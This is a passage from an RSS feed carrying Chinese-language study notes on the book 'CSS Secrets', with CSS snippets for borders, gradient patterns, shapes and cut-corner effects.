      <source url="https://www.matrixtheone.ga/web/rss.xml">CSS 权威指南（下）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>CSS 揭秘</title>
      <link>https://www.matrixtheone.ga/web/note/books/CSS-Secrets/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/CSS-Secrets/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">CSS 揭秘</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-尽量减少代码重复"> 1. 尽量减少代码重复</h2>
<ul>
<li>代码易维护 vs 代码量少</li>
</ul>
<div><pre><code><span>/* 代码易维护 */</span>
<span>border-width</span><span>:</span> 10px<span>;</span>
<span>border-left-width</span><span>:</span> 0<span>;</span>

<span>/* 代码量少 */</span>
<span>border-width</span><span>:</span> 10px 10px 10px 0<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>
<p>currentColor： currentColor 是很多 CSS 颜色属性的初始值，比如 border-color 和 outline-color，以及 text-shadow 和 box-shadow 的颜色值，等等。</p>
</li>
<li>
<p>继承： inherit 可以用在任何 CSS 属性中，而且它总是绑定到父元素的计算值（对伪元素来说，则会取生成该伪元素的宿主元素）。</p>
</li>
</ul>
<div><pre><code><span>.callout</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>
<span>.callout::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> -0.4em<span>;</span>
  <span>left</span><span>:</span> 1em<span>;</span>
  <span>padding</span><span>:</span> 0.35em<span>;</span>
  <span>background</span><span>:</span> inherit<span>;</span>
  <span>border</span><span>:</span> inherit<span>;</span>
  <span>border-right</span><span>:</span> 0<span>;</span>
  <span>border-bottom</span><span>:</span> 0<span>;</span>
  <span>transform</span><span>:</span> <span>rotate</span><span>(</span>45deg<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_2-合理使用简写"> 2. 合理使用简写</h2>
<ul>
<li>
<p>不要害怕使用简写属性。合理使用简写是一种良好的防卫性编码方式，可以抵御未来的风险。当然，如果我们要明确地去覆盖某个具体的展开式属性并保留其他相关样式，那就需要用展开式属性，就像我们在 “尽量减少代码重复” 一节中为了得到按钮的其他颜色版本所做的那样。</p>
</li>
<li>
<p>如果只为某个属性提供一个值，那它就会扩散并应用到列表中的每一项。</p>
</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span><span>url</span><span>(</span>tr.png<span>)</span></span> no-repeat top right / 2em 2em<span>,</span>
            <span><span>url</span><span>(</span>br.png<span>)</span></span> no-repeat bottom right / 2em 2em<span>,</span>
            <span><span>url</span><span>(</span>bl.png<span>)</span></span> no-repeat bottom left / 2em 2em<span>;</span>

<span>/* 展开式属性与简写属性的配合 */</span>
<span>background</span><span>:</span> <span><span>url</span><span>(</span>tr.png<span>)</span></span> top right<span>,</span>
            <span><span>url</span><span>(</span>br.png<span>)</span></span> bottom right<span>,</span>
            <span><span>url</span><span>(</span>bl.png<span>)</span></span> bottom left<span>;</span>
<span>background-size</span><span>:</span> 2em 2em<span>;</span>
<span>background-repeat</span><span>:</span> no-repeat<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li>怪异的简写语法：
<blockquote>
<ul>
<li>在 background 简写属性中指定 background-size 时，需要同时提供一个 background-position 值（哪怕它的值就是其初始值也需要写出来），而且还要使用一个斜杠（ / ）作为分隔。</li>
<li>这通常都是为了消除歧义。在这个例子中， top right 显然是 background-position ，而 2em 2em 是 background-size，不管它们的顺序如何。但是，请设想一下 50% 50% 这样的值，它到底是 background-size 还是 background-position 呢？当你在使用展开式属性时，CSS 解析器明白你的意图。而当你使用简写属性时，解析器需要在没有属性名提示的情况下弄清楚 50% 50% 到底指什么，这就是需要引入斜杠的原因。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_3-半透明边框-demo"> 3. 半透明边框（<a href="http://play.csssecrets.io/translucent-borders" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>默认情况下，背景会延伸到边框所在的区域下层。</li>
</ul>
<div><pre><code><span>/* 背景延伸，边框为白色 */</span>
<span>border</span><span>:</span> 10px solid <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.5<span>)</span><span>;</span>
<span>background</span><span>:</span> white<span>;</span>

<span>/* 裁切后，边框半透明 */</span>
<span>border</span><span>:</span> 10px solid <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.5<span>)</span><span>;</span>
<span>background</span><span>:</span> white<span>;</span>
<span>background-clip</span><span>:</span> padding-box<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_4-多重边框"> 4. 多重边框</h2>
<ul>
<li>box-shadow 方案：多重实体边框（<a href="http://play.csssecrets.io/multiple-borders" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> yellowgreen<span>;</span>
<span>box-shadow</span><span>:</span> 0 0 0 10px #655<span>,</span>
            0 0 0 15px deeppink<span>,</span>
            0 2px 5px 15px <span>rgba</span><span>(</span>0<span>,</span>0<span>,</span>0<span>,</span>.6<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><ul>
<li>
<p>outline 方案：两层边框。</p>
<blockquote>
<ul>
<li>边框不一定会贴合 border-radius 属性产生的圆角，因此如果元素是圆角的，它的描边可能还是直角的。请注意，这种行为被 CSS 工作组认为是一个 bug，因此未来可能会改为贴合 border-radius 圆角。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>background</span><span>:</span> yellowgreen<span>;</span>
<span>border</span><span>:</span> 10px solid #655<span>;</span>
<span>outline</span><span>:</span> 5px solid deeppink<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_5-灵活的背景定位"> 5. 灵活的背景定位</h2>
<ul>
<li>background-position 的扩展语法方案（<a href="http://play.csssecrets.io/extended-bg-position" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span><span>url</span><span>(</span>code-pirate.svg<span>)</span></span> no-repeat #58a<span>;</span>
<span>background-position</span><span>:</span> right 20px bottom 10px<span>;</span>

<span>/* 回退方案 */</span>
<span>background</span><span>:</span> <span><span>url</span><span>(</span>code-pirate.svg<span>)</span></span> no-repeat bottom right #58a<span>;</span>
<span>background-position</span><span>:</span> right 20px bottom 10px<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>background-origin 方案（<a href="http://play.csssecrets.io/background-origin" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>/* 每次改动内边距的值时，我们都需要在三个地方更新这个值 */</span>
<span>padding</span><span>:</span> 10px<span>;</span>
<span>background</span><span>:</span> <span><span>url</span><span>(</span>code-pirate.svg<span>)</span></span> no-repeat #58a<span>;</span>
<span>background-position</span><span>:</span> right 10px bottom 10px<span>;</span>

<span>/* 使用 background-origin后，背景图片距离边角的偏移量就跟内边距保持一致了 */</span>
<span>padding</span><span>:</span> 10px<span>;</span>
<span>background</span><span>:</span> <span><span>url</span><span>(</span><span>'code-pirate.svg'</span><span>)</span></span> no-repeat #58a bottom right<span>;</span> <span>/* 或 100% 100% */</span>
<span>background-origin</span><span>:</span> content-box<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><ul>
<li>calc() 方案（<a href="http://play.csssecrets.io/background-position-calc" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span><span>url</span><span>(</span><span>'code-pirate.svg'</span><span>)</span></span> no-repeat<span>;</span>
<span>background-position</span><span>:</span> <span>calc</span><span>(</span>100% - 20px<span>)</span> <span>calc</span><span>(</span>100% - 10px<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_6-边框内圆角"> 6. 边框内圆角</h2>
<ul>
<li>
<p>一个元素实现（<a href="http://play.csssecrets.io/inner-rounding" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
<blockquote>
<ul>
<li>请注意，我们为 box-shadow 属性指定的扩张值并不一定等于描边的宽度，我们只需要指定一个足够填补 “空隙” 的扩张值就可以了。</li>
<li>扩张值计算：border-radius * (√2 - 1)。</li>
<li>请注意，该计算过程揭示了这个方法的另一个限制：为了让这个效果得以达成，扩张半径需要比描边的宽度值小，但它同时又要比 (√2 - 1)r 大（这里的 r 表示 border-radius ）。这意味着，如果描边的宽度比 (√2 - 1)r 小，那我们是不可能用这个方法达成该效果的。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>background</span><span>:</span> tan<span>;</span>
<span>border-radius</span><span>:</span> 0.8em<span>;</span>
<span>padding</span><span>:</span> 1em<span>;</span>
<span>box-shadow</span><span>:</span> 0 0 0 0.6em #655<span>;</span>
<span>outline</span><span>:</span> 0.6em solid #655<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_7-条纹背景"> 7. 条纹背景</h2>
<ul>
<li>
<p>水平条纹（<a href="http://play.csssecrets.io/horizontal-stripes" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
<blockquote>
<ul>
<li>CSS3：如果某个色标的位置值比整个列表中在它之前的色标的位置值都要小，则该色标的位置值会被设置为它前面所有色标位置值的最大值。</li>
<li>这意味着，如果我们把第二个色标的位置值设置为 0，那它的位置就总是会被浏览器调整为前一个色标的位置值。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>#fb3 33.3%<span>,</span> #58a 0<span>,</span> #58a 66.6%<span>,</span> yellowgreen 0<span>)</span><span>;</span>
<span>background-size</span><span>:</span> 100% 45px<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><ul>
<li>垂直条纹（<a href="http://play.csssecrets.io/vertical-stripes" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>to right<span>,</span> <span>/* 或 90deg */</span> #fb3 50%<span>,</span> #58a 0<span>)</span><span>;</span>
<span>background-size</span><span>:</span> 30px 100%<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><ul>
<li>
<p>斜向条纹（<a href="http://play.csssecrets.io/diagonal-stripes" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
<blockquote>
<ul>
<li>background-size 计算： 2 * 条纹宽度 * √2</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>
  45deg<span>,</span>
  #fb3 25%<span>,</span>
  #58a 0<span>,</span>
  #58a 50%<span>,</span>
  #fb3 0<span>,</span>
  #fb3 75%<span>,</span>
  #58a 0
<span>)</span><span>;</span>
<span>background-size</span><span>:</span> 42px 42px<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li>更好的斜向条纹（<a href="http://play.csssecrets.io/diagonal-stripes-60deg" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span>repeating-linear-gradient</span><span>(</span>
  60deg<span>,</span>
  #fb3<span>,</span>
  #fb3 15px<span>,</span>
  #58a 0<span>,</span>
  #58a 30px
<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><ul>
<li>更好的斜向条纹（<a href="http://play.csssecrets.io/subtle-stripes" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span>
<span>background-image</span><span>:</span> <span>repeating-linear-gradient</span><span>(</span>
  30deg<span>,</span>
  <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.1<span>)</span><span>,</span>
  <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.1<span>)</span> 15px<span>,</span>
  transparent 0<span>,</span>
  transparent 30px
<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_8-复杂的背景图案"> 8. 复杂的背景图案</h2>
<ul>
<li>网格（<a href="http://play.csssecrets.io/blueprint" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span>
<span>background-image</span><span>:</span> <span>linear-gradient</span><span>(</span>white 2px<span>,</span> transparent 0<span>)</span><span>,</span> <span>linear-gradient</span><span>(</span>
    90deg<span>,</span>
    white 2px<span>,</span>
    transparent 0
  <span>)</span><span>,</span> <span>linear-gradient</span><span>(</span><span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.3<span>)</span> 1px<span>,</span> transparent 0<span>)</span><span>,</span> <span>linear-gradient</span><span>(</span>90deg<span>,</span> <span>hsla</span><span>(</span>
        0<span>,</span>
        0%<span>,</span>
        100%<span>,</span>
        0.3
      <span>)</span> 1px<span>,</span> transparent 0<span>)</span><span>;</span>
<span>background-size</span><span>:</span> 75px 75px<span>,</span> 75px 75px<span>,</span> 15px 15px<span>,</span> 15px 15px<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><ul>
<li>波点（<a href="http://play.csssecrets.io/polka" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #655<span>;</span>
<span>background-image</span><span>:</span> <span>radial-gradient</span><span>(</span>tan 30%<span>,</span> transparent 0<span>)</span><span>,</span> <span>radial-gradient</span><span>(</span>tan
      30%<span>,</span> transparent 0<span>)</span><span>;</span>
<span>background-size</span><span>:</span> 30px 30px<span>;</span>
<span>background-position</span><span>:</span> 0 0<span>,</span> 15px 15px<span>;</span>

<span>/* SCSS */</span>
<span><span>@mixin</span> <span>polka</span><span>(</span>$size<span>,</span> $dot<span>,</span> $base<span>,</span> $accent<span>)</span></span> <span>{</span>
  <span>background</span><span>:</span> $base<span>;</span>
  <span>background-image</span><span>:</span> <span>radial-gradient</span><span>(</span>$accent $dot<span>,</span> transparent 0<span>)</span><span>,</span>
    <span>radial-gradient</span><span>(</span>$accent $dot<span>,</span> transparent 0<span>)</span><span>;</span>
  <span>background-size</span><span>:</span> $size $size<span>;</span>
  <span>background-position</span><span>:</span> 0 0<span>,</span> $size/2 $size/2<span>;</span>
<span>}</span>
<span>/* 使用 */</span>
<span><span>@include</span> <span>polka</span><span>(</span>30px<span>,</span> 30%<span>,</span> #655<span>,</span> tan<span>)</span><span>;</span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><ul>
<li>棋盘（<a href="http://play.csssecrets.io/checkerboard-svg" target="_blank" rel="noopener noreferrer">svg</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #eee<span>;</span>
<span>background-image</span><span>:</span> <span>linear-gradient</span><span>(</span>
    45deg<span>,</span>
    <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.25<span>)</span> 25%<span>,</span>
    transparent 0<span>,</span>
    transparent 75%<span>,</span>
    <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.25<span>)</span> 0
  <span>)</span><span>,</span> <span>linear-gradient</span><span>(</span>45deg<span>,</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.25<span>)</span> 25%<span>,</span> transparent 0<span>,</span> transparent
      75%<span>,</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.25<span>)</span> 0<span>)</span><span>;</span>
<span>background-position</span><span>:</span> 0 0<span>,</span> 15px 15px<span>;</span>
<span>background-size</span><span>:</span> 30px 30px<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>角向渐变（<a href="http://play.csssecrets.io/test-conic-gradient" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span>repeating-conic-gradient</span><span>(</span>#bbb 0<span>,</span> #bbb 25%<span>,</span> #eee 0<span>,</span> #eee 50%<span>)</span><span>;</span>
<span>background-size</span><span>:</span> 30px 30px<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_9-伪随机背景-demo"> 9. 伪随机背景（<a href="http://play.csssecrets.io/cicada-stripes" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>为了进一步增加随机性，我们甚至可以用质数来指定各组条纹的宽度。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span>hsl</span><span>(</span>20<span>,</span> 40%<span>,</span> 90%<span>)</span><span>;</span>
<span>background-image</span><span>:</span> <span>linear-gradient</span><span>(</span>90deg<span>,</span> #fb3 11px<span>,</span> transparent 0<span>)</span><span>,</span>
  <span>linear-gradient</span><span>(</span>90deg<span>,</span> #ab4 23px<span>,</span> transparent 0<span>)</span><span>,</span> <span>linear-gradient</span><span>(</span>90deg<span>,</span> #655
      41px<span>,</span> transparent 0<span>)</span><span>;</span>
<span>background-size</span><span>:</span> 41px 100%<span>,</span> 61px 100%<span>,</span> 83px 100%<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_10-连续的图像边框"> 10. 连续的图像边框</h2>
<ul>
<li>一个元素实现（<a href="http://play.csssecrets.io/continuous-image-borders" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>padding</span><span>:</span> 1em<span>;</span>
<span>border</span><span>:</span> 1em solid transparent<span>;</span>
<span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>white<span>,</span> white<span>)</span> padding-box<span>,</span> <span><span>url</span><span>(</span>stone-art.jpg<span>)</span></span>
    border-box 0 / cover<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><ul>
<li>老式信封样式的边框（<a href="http://play.csssecrets.io/vintage-envelope" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>padding</span><span>:</span> 1em<span>;</span>
<span>border</span><span>:</span> 1em solid transparent<span>;</span>
<span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>white<span>,</span> white<span>)</span> padding-box<span>,</span> <span>repeating-linear-gradient</span><span>(</span>
      -45deg<span>,</span>
      red 0<span>,</span>
      red 12.5%<span>,</span>
      transparent 0<span>,</span>
      transparent 25%<span>,</span>
      #58a 0<span>,</span>
      #58a 37.5%<span>,</span>
      transparent 0<span>,</span>
      transparent 50%
    <span>)</span> 0 / 5em 5em<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><ul>
<li>蚂蚁行军边框（<a href="http://play.csssecrets.io/marching-ants" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span>@keyframes</span> ants</span> <span>{</span>
  <span>to</span> <span>{</span>
    <span>background-position</span><span>:</span> 100%<span>;</span>
  <span>}</span>
<span>}</span>
<span>.marching-ants</span> <span>{</span>
  <span>padding</span><span>:</span> 1em<span>;</span>
  <span>border</span><span>:</span> 1px solid transparent<span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>white<span>,</span> white<span>)</span> padding-box<span>,</span> <span>repeating-linear-gradient</span><span>(</span>
        -45deg<span>,</span>
        black 0<span>,</span>
        black 25%<span>,</span>
        white 0<span>,</span>
        white 50%
      <span>)</span> 0 / 0.6em 0.6em<span>;</span>
  <span>animation</span><span>:</span> ants 12s linear infinite<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><ul>
<li>顶部边框的裁切效果（<a href="http://play.csssecrets.io/footnote" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>border-top</span><span>:</span> 0.2em solid transparent<span>;</span>
<span>border-image</span><span>:</span> 100% 0 0 <span>linear-gradient</span><span>(</span>90deg<span>,</span> currentColor 4em<span>,</span> transparent 0<span>)</span><span>;</span>
<span>padding-top</span><span>:</span> 1em<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_11-自适应的椭圆"> 11. 自适应的椭圆</h2>
<ul>
<li>半椭圆（<a href="http://play.csssecrets.io/half-ellipse" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>border-radius</span><span>:</span> 50% / 100% 100% 0 0<span>;</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>四分之一椭圆（<a href="http://play.csssecrets.io/quarter-ellipse" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>border-radius</span><span>:</span> 100% 0 0 0<span>;</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_12-平行四边形"> 12. 平行四边形</h2>
<ul>
<li>基本的 CSS 变形：文字也会倾斜。</li>
</ul>
<div><pre><code><span>transform</span><span>:</span> <span>skewX</span><span>(</span>-45deg<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>嵌套元素方案：对内容再应用一次反向的 skew() 变形，从而抵消容器的形效果（<a href="http://play.csssecrets.io/parallelograms" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>#yolo<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>button<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>Click me<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>a</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>.button</span> <span>{</span>
  <span>transform</span><span>:</span> <span>skewX</span><span>(</span>-45deg<span>)</span><span>;</span>
<span>}</span>
<span>.button > div</span> <span>{</span>
  <span>transform</span><span>:</span> <span>skewX</span><span>(</span>45deg<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>伪元素方案：把所有样式（背景、边框等）应用到伪元素上，然后再对
伪元素进行变形（<a href="http://play.csssecrets.io/parallelograms-pseudo" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>.button</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>`
  <span>/* 其他的文字颜色、内边距等样式…… */</span>
<span>}</span>
<span>.button::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span> <span>/* 用伪元素来生成一个矩形 */</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>background</span><span>:</span> #58a<span>;</span>
  <span>transform</span><span>:</span> <span>skew</span><span>(</span>45deg<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_13-菱形图片"> 13. 菱形图片</h2>
<ul>
<li>基于变形的方案（<a href="http://play.csssecrets.io/diamond-images" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>picture<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>adam-catlace.jpg<span>"</span></span> <span>alt</span><span><span>=</span><span>"</span>...<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>.picture</span> <span>{</span>
  <span>width</span><span>:</span> 400px<span>;</span>
  <span>transform</span><span>:</span> <span>rotate</span><span>(</span>45deg<span>)</span><span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
<span>.picture > img</span> <span>{</span>
  <span>max-width</span><span>:</span> 100%<span>;</span>
  <span>/* transform: rotate(-45deg);  */</span> <span>/* 等边八角形 */</span>
  <span>transform</span><span>:</span> <span>rotate</span><span>(</span>-45deg<span>)</span> <span>scale</span><span>(</span>1.42<span>)</span><span>;</span> <span>/* 1.42 为等边三角形对角线比例 √2 向上取整值 */</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li>裁切路径方案 - 不完全支持（<a href="http://play.csssecrets.io/diamond-clip" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>50% 0<span>,</span> 100% 50%<span>,</span> 50% 100%<span>,</span> 0 50%<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>/* 鼠标悬停时平滑地扩展为完整的面积 */</span>
<span>img</span> <span>{</span>
  <span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>50% 0<span>,</span> 100% 50%<span>,</span> 50% 100%<span>,</span> 0 50%<span>)</span><span>;</span>
  <span>transition</span><span>:</span> 1s clip-path<span>;</span>
<span>}</span>
<span>img:hover</span> <span>{</span>
  <span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>0 0<span>,</span> 100% 0<span>,</span> 100% 100%<span>,</span> 0 100%<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_14-切角效果"> 14. 切角效果</h2>
<ul>
<li>线性渐变切一个角。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span> <span>/* 回退样式 */</span>
<span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>-45deg<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><ul>
<li>线性渐变切多个角（<a href="http://play.csssecrets.io/bevel-corners-gradients" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span> <span>/* 回退样式 */</span>
<span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>135deg<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span> top left<span>,</span> <span>linear-gradient</span><span>(</span>
      -135deg<span>,</span>
      transparent 15px<span>,</span>
      #58a 0
    <span>)</span> top right<span>,</span> <span>linear-gradient</span><span>(</span>-45deg<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span> bottom right<span>,</span>
  <span>linear-gradient</span><span>(</span>45deg<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span> bottom left<span>;</span>
<span>background-size</span><span>:</span> 50% 50%<span>;</span>
<span>background-repeat</span><span>:</span> no-repeat<span>;</span>

<span>/* SCSS */</span>
